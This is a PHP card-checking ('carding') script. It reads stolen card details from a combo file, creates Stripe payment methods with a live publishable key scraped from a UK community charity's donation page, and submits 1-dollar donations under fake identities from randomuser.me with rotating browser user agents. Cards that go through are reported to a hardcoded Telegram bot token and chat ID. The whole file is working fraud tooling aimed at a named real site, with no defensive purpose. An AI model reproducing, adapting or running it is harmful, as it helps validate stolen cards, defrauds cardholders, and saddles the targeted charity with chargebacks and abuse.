<?php
error_reporting(0);
function payment($card,$ccNo,$month,$year,$cvv){

    $length = strlen($year);
    if($length == 2){
    	if($year < 24){
	    	return [
	    		false,
	    		"$card - Expired Card \n"
	    	];
	    }
    }else{
    	if($year < 2024 ){
	    	return [
	    		false,
	    		"$card - Expired Card \n"
	    	];
	    }
    }
$data = array(
    'type' => 'card',
    'card' => array(
        'number' => $ccNo,
        'cvc' => $cvv,
        'exp_month' => $month,
        'exp_year' => $year
    ),
    'guid' => 'NA',
    'muid' => 'NA',
    'sid' => 'NA',
    'pasted_fields' => 'number',
    'payment_user_agent' => 'stripe.js/d182db0e09; stripe-js-v3/d182db0e09; card-element',
    'referrer' => 'https://www.strolloxcommunity.org.uk',
    'time_on_page' => 200441,
    'key' => 'pk_live_51NpUfeFnpXeLM6Ynnp8CNIyiWlZFM7s6NCvRbr2dMquOAFSgDMOcSNtEFhhRyfEwvLyKIpW8vG8GO92mIZ7pcKfs00y6Sh2yEw'
	);
	$url = "https://api.stripe.com/v1/payment_methods";

	$ch = curl_init();

	// Set cURL options
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	// curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	// curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);
	if (curl_errno($ch)) {
		die("cURL Error: " . curl_error($ch));
	    return [
    		false,
    		"$card - Request Error On Payment \n"
    	];
	}

	curl_close($ch);
	$data = json_decode($response,true);
	if(isset($data['id']) ){
		$paymentId = $data['id'];
		return [
			true,
			$paymentId
		];
	}else{
		$paymentId = $data['id'];
		return [
			false,
			"$card - Invalid Payment ID \n"
		];
	}	
}
function donate($card,$paymentId,$name,$email){
	$formData = "data=__fluent_form_embded_post_id%3D108%26_fluentform_3_fluentformnonce%3D5dbbc40800%26_wp_http_referer%3D%252Fdonate%252F%26names%255Bfirst_name%255D%3D$name%26names%255Blast_name%255D%3D$name%26input_text_2%3D4132004701%26email%3D$email%26address1%255Baddress_line_1%255D%3D125%2520Klee%2520Lane%26address1%255Baddress_line_2%255D%3D%26address1%255Bcity%255D%3DNew%2520York%26address1%255Bstate%255D%3DNY%26address1%255Bzip%255D%3D10080%26address1%255Bcountry%255D%3DUS%26payment_input_1%3D1%26payment_input_1_custom_0%3D5%26payment_input_1_custom_1%3D1%26payment_method%3Dstripe%26__stripe_payment_method_id%3D$paymentId&action=fluentform_submit&form_id=3";
	$userAgents = [
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/88.0',
	    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
	    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36'
	];

	$randomUserAgent = $userAgents[array_rand($userAgents)];
	// $username = "";
	// $password = "";
	// $PROXYSCRAPE_PORT = ;
	// $PROXYSCRAPE_HOSTNAME = '';
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'https://www.strolloxcommunity.org.uk/wp-admin/admin-ajax.php?t=1722859739767');
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $formData);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
	    'Referer: https://www.strolloxcommunity.org.uk/donate/',
	    'User-Agent: ' . $randomUserAgent,
	    'X-Requested-With: XMLHttpRequest'
	));
	// curl_setopt($ch, CURLOPT_PROXYPORT, $PROXYSCRAPE_PORT);
	// curl_setopt($ch, CURLOPT_PROXYTYPE, 'HTTP');
	// curl_setopt($ch, CURLOPT_PROXY, $PROXYSCRAPE_HOSTNAME);
	// curl_setopt($ch, CURLOPT_PROXYUSERPWD, $username.':'.$password);
	$response = curl_exec($ch);
	if (curl_errno($ch)) {
	    return [
    		false,
    		"$card -Proxy Error \n"
    	];
	} else {
	    $data = json_decode($response,true);
	    if(isset($data['errors'])){
	    	if(isset($data['errors']) && strpos($data['errors'], "insufficient funds") === 0){
		    	sendTele("$card - Insufficient Funds 1$");
		    	return [
		    		true,
		    		"$card - Insufficient Funds 1$ \n"
		    	];
		    }else{
		    	$errors = $data['errors'];
		    	return [
		    		false,
		    		"$card - $errors \n"
		    	];
		    }
	    }elseif(isset($data['success'])){
	    	if(strpos($data['data']['message'],"Verifying strong customer authentication. Please wait...") === 0){
	    		sendTele("$card - CVV LIVE 1$ (Request 3D Secure)");
	    		return [
	    		true,
	    		"$card - CVV LIVE 1$ (Request 3D Secure) \n"
	    	];
	    	}else{
	    		sendTele("$card - Approved 1$");
	    		return [
	    		true,
	    		"$card - Approved 1$ \n"
	    	];
	    	}
	    }
	}
	curl_close($ch);

}
function random(){
	$apiUrl = 'https://randomuser.me/api/?nat=us';
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $apiUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
    	return [
    		false,
    		"Request Error On Random Generation \n"
    	];
    }
    curl_close($ch);
    $data = json_decode($response);
    if ($data && isset($data->results[0])) {
    	$result = $data->results[0];
        $firstName = $result->name->first;
        $email = $result->email;
        $emailDomains = ["@gmail.com", "@outlook.com", "@hotmail.com"];
        $randomDomain = $emailDomains[array_rand($emailDomains)];
        $modifiedEmail = preg_replace('/@.+$/', $randomDomain, $email);
        return [
        	true,
        	$firstName,
        	$modifiedEmail
        ];
    } else {
    	return [
    		false,
    		"Random generation Error \n"
    	];
    }
}
function sendTele($message){
	$url = $GLOBALS['endpoint'] . "/sendMessage?chat_id=1668286923&text=" . urlencode($message);
    file_get_contents($url);
}
function generateIdentifier($type) {
    $hex = function($length) {
        $hex = '';
        for ($i = 0; $i < $length; $i++) {
            $hex .= dechex(mt_rand(0, 15));
        }
        return $hex;
    };

    switch ($type) {
        case 'guid':
            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
        case 'muid':
            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
        case 'sid':
            return $hex(8) . '-' . $hex(4) . '-' . $hex(4) . '-' . $hex(12);
        default:
            return null; // or throw an exception if the type is unknown
    }
}
$file = "combo.txt";
$cardList = file_get_contents($file);

if ($cardList === false) {
    die("Error: Unable to read card list file. \n");
}
$botToken = "7201459757:AAE7CCAlBLCQ1ouzRva6tNBf3w2WMxoLXT8";
$endpoint = "https://api.telegram.org/bot".$botToken;
$cards = array_map('trim',explode("\n", $cardList));
foreach ($cards as $card) {
	$ecard = array_map('trim', explode("|", $card));
    $ccNo = $ecard[0];
    $month = $ecard[1];
    $year = $ecard[2];
    $cvv = $ecard[3];
    $guid = generateIdentifier('guid');
    $muid = generateIdentifier('muid');
    $sid = generateIdentifier('sid');
	$paymentDetils = payment($card,$ccNo,$month,$year,$cvv,$guid,$muid,$sid);
	$randominfo = random();
	if($paymentDetils[0] !== false){
		if($randominfo[0] !== false){
			$name = $randominfo[1];
	        $email = $randominfo[2];
	        $paymentId = $paymentDetils[1];
	        $donateResult = donate($card,$paymentId,$name,$email);
	        if($donateResult[0] !== false){
	        	echo $donateResult[1];
	        }else{
	            echo $donateResult[1];
	        }
	    }else{
	        echo $randominfo[1];
	    }
	}else{
	    echo $paymentDetils[1];
	}
	sleep(6);
}

?>
